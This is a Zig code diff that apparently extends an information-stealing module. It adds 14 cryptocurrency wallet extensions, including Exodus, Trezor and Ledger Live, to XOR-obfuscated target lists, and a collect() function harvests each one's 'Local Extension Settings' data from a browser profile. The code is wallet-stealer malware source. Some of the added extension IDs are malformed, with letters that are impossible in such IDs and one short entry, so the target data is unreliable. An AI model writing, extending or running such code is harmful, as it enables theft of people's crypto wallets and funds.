@@ -8,7 +8,7 @@ pub const WalletDir = struct {
 };
 
 const E = struct {
-    pub const names = [82][]const u8{
+    pub const names = [96][]const u8{
         &hash.xorEncrypt("MetaMask"),
         &hash.xorEncrypt("Binance"),
         &hash.xorEncrypt("Coinbase"),
@@ -91,8 +91,22 @@ const E = struct {
         &hash.xorEncrypt("Notion"),
         &hash.xorEncrypt("Evernote"),
         &hash.xorEncrypt("Google Keep"),
+        &hash.xorEncrypt("Trust Wallets"),
+        &hash.xorEncrypt("MetaWallet"),
+        &hash.xorEncrypt("Exodus"),
+        &hash.xorEncrypt("JaxxxLiberty"),
+        &hash.xorEncrypt("Atomic Wallet"),
+        &hash.xorEncrypt("Mycelium"),
+        &hash.xorEncrypt("GreenAddress"),
+        &hash.xorEncrypt("Edge"),
+        &hash.xorEncrypt("Bread"),
+        &hash.xorEncrypt("KeepKey"),
+        &hash.xorEncrypt("Trezor"),
+        &hash.xorEncrypt("Ledger Live"),
+        &hash.xorEncrypt("Ledger Wallet"),
+        &hash.xorEncrypt("Copay"),
     };
-    pub const ids = [82][]const u8{
+    pub const ids = [96][]const u8{
         &hash.xorEncrypt("nkbihfbeogaeaoehlefnkodbefgpgknn"),
         &hash.xorEncrypt("fhbohimaelbohpjbbldcngcnapndodjp"),
         &hash.xorEncrypt("hnfanknocfeofbddgcijnmhnfnkdnaad"),
@@ -175,6 +189,20 @@ const E = struct {
         &hash.xorEncrypt("henkngclnkogllllnopoogadhifbkhfa"),
         &hash.xorEncrypt("enhpjihddgdpgncncbgkpbmafkpkjnpa"),
         &hash.xorEncrypt("omjhfjobhndiodddgboojcponaoafbnc"),
+        &hash.xorEncrypt("pknlccmneadmjbkollckpblgaaabameg"),
+        &hash.xorEncrypt("pfknkoocfefiocadajpngdknmkjgakdg"),
+        &hash.xorEncrypt("idkppnahnmmggbmfkjhiakkbkdpnmnon"),
+        &hash.xorEncrypt("mhonjhhcgphdphdjcdoeodfdliikapmj"),
+        &hash.xorEncrypt("bhmlbgebokamljgnceonbncdofmmkedg"),
+        &hash.xorEncrypt("pidhddgciaponoajdngciemcflpnnbg"),
+        &hash.xorEncrypt("gflpckpfdgcagnbdfafmibcmkadnlhpj"),
+        &hash.xorEncrypt("doljkehcfhidippihgakcihcmnknlphh"),
+        &hash.xorEncrypt("jifanbgejlbcmhbbdbnfbfnlmbomjedj"),
+        &hash.xorEncrypt("dojmlmceifkfgkgeejemfciibjehhdcl"),
+        &hash.xorEncrypt("jpxupxjxheguvfyhfhahqvxvyqthiryh"),
+        &hash.xorEncrypt("pfkcfdjnlfjcmkjnhcbfhfkkoflnhjln"),
+        &hash.xorEncrypt("hbpfjlflhnmkddbjdchbbifhllgmmhnm"),
+        &hash.xorEncrypt("ieedgmmkpkbiblijbbldefkomatsuahh"),
     };
     pub const ext_settings = hash.xorEncrypt("Local Extension Settings");
 };
@@ -220,7 +248,7 @@ pub fn collect(allocator: std.mem.Allocator, browser_profile_path: []const u8) !
     var ext_settings_buf: [E.ext_settings.len]u8 = undefined;
     hash.xorDecrypt(&E.ext_settings, &ext_settings_buf);
 
-    inline for (0..82) |i| {
+    inline for (0..96) |i| {
         const id_enc = E.ids[i];
         var id_buf: [id_enc.len]u8 = undefined;
         hash.xorDecrypt(id_enc, &id_buf);
@@ -250,7 +278,7 @@ pub fn collect(allocator: std.mem.Allocator, browser_profile_path: []const u8) !
 }
 
 test "extension count" {
-    try std.testing.expect(E.names.len == 82);
+    try std.testing.expect(E.names.len == 96);
 }
 
 test "first extension is MetaMask" {
@@ -259,10 +287,10 @@ test "first extension is MetaMask" {
     try std.testing.expectEqualSlices(u8, "MetaMask", &buf);
 }
 
-test "last extension is Google Keep" {
-    var buf: [E.names[81].len]u8 = undefined;
-    hash.xorDecrypt(E.names[81], &buf);
-    try std.testing.expectEqualSlices(u8, "Google Keep", &buf);
+test "last extension is Copay" {
+    var buf: [E.names[95].len]u8 = undefined;
+    hash.xorDecrypt(E.names[95], &buf);
+    try std.testing.expectEqualSlices(u8, "Copay", &buf);
 }
 
 test "collect returns empty for nonexistent profile" {
